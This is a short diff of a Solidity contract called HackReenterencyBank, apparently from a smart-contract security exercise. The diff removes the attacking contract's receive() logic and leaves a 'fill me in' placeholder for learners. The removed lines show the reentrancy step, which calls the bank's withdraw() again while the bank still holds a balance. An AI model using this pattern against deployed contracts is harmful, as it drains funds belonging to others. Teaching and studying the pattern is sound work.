@@ -15,8 +15,6 @@ contract HackReenterencyBank {
     }
 
     receive() external payable {
-        if (address(reenterencyBank).balance > 0) {
-            reenterencyBank.withdraw();
-        }
+        // fill me in!
     }
 }
